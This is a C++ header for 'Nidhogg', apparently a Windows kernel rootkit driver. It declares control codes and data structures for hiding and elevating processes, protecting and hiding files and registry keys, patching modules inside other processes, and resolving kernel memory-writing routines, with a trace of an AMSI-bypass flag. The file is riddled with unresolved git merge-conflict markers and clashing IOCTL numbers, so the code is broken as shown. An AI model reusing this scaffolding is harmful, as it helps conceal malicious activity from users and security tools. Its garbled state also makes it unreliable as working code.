#pragma once

// Includes.
#include "FastMutex.h"
#include "AutoLock.h"

#define DRIVER_PREFIX "Nidhogg: "
#define DRIVER_DEVICE_NAME L"\\Device\\Nidhogg"
#define DRIVER_SYMBOLIC_LINK L"\\??\\Nidhogg"
#define DRIVER_TAG 'hdiN'
#define OB_CALLBACKS_ALTITUDE L"31105.6171"
#define REG_CALLBACK_ALTITUDE L"31122.6172"

// ** IOCTLS ********************************************************************************************
#define IOCTL_NIDHOGG_PROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_HIDE_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_ELEVATE_PROCESS CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_PROCESSES CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)

<<<<<<< HEAD
#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_FILES CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)

<<<<<<< HEAD
#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
// #define IOCTL_NIDHOGG_HIDE_REGITEM CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS) --> Currently protect and hide is the same, will be changed in the future.
=======
#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
// #define IOCTL_NIDHOGG_HIDE_REGITEM CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS) --> Currently protect and hide is the same, will be changed in the future.
>>>>>>> 0a9676d (Pre version 0.1 (#6))
=======
#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
<<<<<<< HEAD
<<<<<<< HEAD
// #define IOCTL_NIDHOGG_HIDE_REGITEM CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS) --> Currently protect and hide is the same, will be changed in the future.
>>>>>>> 4fc3e3e (Added file query ability)
=======
>>>>>>> ffc9bcf (Seperated hidden and protected registry items.)
=======

<<<<<<< HEAD
#define IOCTL_NIDHOGG_GLOBAL_PATCH_MODULE CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_GLOBAL_UNPATCH_MODULE CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
>>>>>>> 9da4d60 (Added function documentation, refactored code)
=======
#define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
>>>>>>> b431e45 (First failed attempt)
// *****************************************************************************************************

#define MAX_PATCHED_MODULES 256
#define MAX_PIDS 256
#define MAX_PATH 260
#define MAX_FILES 256
#define MAX_REG_ITEMS 256
#define REG_VALUE_LEN 260
#define REG_KEY_LEN 255

// Prototypes.
NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status = STATUS_SUCCESS, ULONG_PTR info = 0);
DRIVER_UNLOAD NidhoggUnload;
DRIVER_DISPATCH NidhoggDeviceControl, NidhoggCreateClose;
void ClearAll();

typedef NTSTATUS(NTAPI* tZwProtectVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, SIZE_T* NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection);
typedef NTSTATUS(NTAPI* tMmCopyVirtualMemory)(PEPROCESS SourceProcess, PVOID SourceAddress, PEPROCESS TargetProcess, PVOID TargetAddress, SIZE_T BufferSize, KPROCESSOR_MODE PreviousMode, PSIZE_T ReturnSize);
typedef PPEB(NTAPI* tPsGetProcessPeb)(PEPROCESS Process);

// Globals.
PVOID registrationHandle = NULL;

struct DynamicImportedModulesGlobal {
	tZwProtectVirtualMemory ZwProtectVirtualMemory;
	tMmCopyVirtualMemory	MmCopyVirtualMemory;
	tPsGetProcessPeb		PsGetProcessPeb;

	void Init() {
		UNICODE_STRING routineName;
		RtlInitUnicodeString(&routineName, L"ZwProtectVirtualMemory");
		ZwProtectVirtualMemory = (tZwProtectVirtualMemory)MmGetSystemRoutineAddress(&routineName);
		RtlInitUnicodeString(&routineName, L"MmCopyVirtualMemory");
		MmCopyVirtualMemory = (tMmCopyVirtualMemory)MmGetSystemRoutineAddress(&routineName);
		RtlInitUnicodeString(&routineName, L"PsGetProcessPeb");
		PsGetProcessPeb = (tPsGetProcessPeb)MmGetSystemRoutineAddress(&routineName);
	}
};
DynamicImportedModulesGlobal dimGlobals;

struct PatchedModule {
	ULONG Pid;
	CHAR* Patch;
	CHAR* FunctionName;
	WCHAR* ModuleName;
};

struct ProcessesList {
	int PidsCount;
	ULONG Pids[MAX_PIDS];
};

struct ProcessGlobals {
	ProcessesList Processes;
	FastMutex Lock;

	void Init() {
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
		Processes. PidsCount = 0;
=======
		PidsCount = 0;
>>>>>>> 0a9676d (Pre version 0.1 (#6))
=======
=======
		BypassAMSI = false;
>>>>>>> 7327b97 (Prettified process features interaction)
=======
>>>>>>> 9da4d60 (Added function documentation, refactored code)
		Processes.PidsCount = 0;
>>>>>>> ffc9bcf (Seperated hidden and protected registry items.)
		Lock.Init();
	}
};
ProcessGlobals pGlobals;

struct FileItem {
	int FileIndex;
	WCHAR FilePath[MAX_PATH];
};

struct FilesList {
	int FilesCount;
	WCHAR* FilesPath[MAX_FILES];
};

struct FileGlobals {
	FilesList Files;
	FastMutex Lock;

	void Init() {
		Files.FilesCount = 0;
		Lock.Init();
	}
};
FileGlobals fGlobals;

struct RegItem {
	int RegItemsIndex;
	ULONG Type;
	WCHAR KeyPath[REG_KEY_LEN];
	WCHAR ValueName[REG_VALUE_LEN];
};

struct RegKeys {
	int KeysCount;
	WCHAR* KeysPath[MAX_REG_ITEMS];
};

struct RegValues {
	int ValuesCount;
	WCHAR* ValuesPath[MAX_REG_ITEMS];
	WCHAR* ValuesName[REG_VALUE_LEN];
};

struct RegItems {
	RegKeys Keys;
	RegValues Values;
};

struct RegistryGlobals {
	RegItems ProtectedItems;
	RegItems HiddenItems;
	LARGE_INTEGER RegCookie;
	FastMutex Lock;

	void Init() {
		ProtectedItems.Keys.KeysCount = 0;
		ProtectedItems.Values.ValuesCount = 0;
		HiddenItems.Keys.KeysCount = 0;
		HiddenItems.Values.ValuesCount = 0;
		Lock.Init();
	}
};
RegistryGlobals rGlobals;
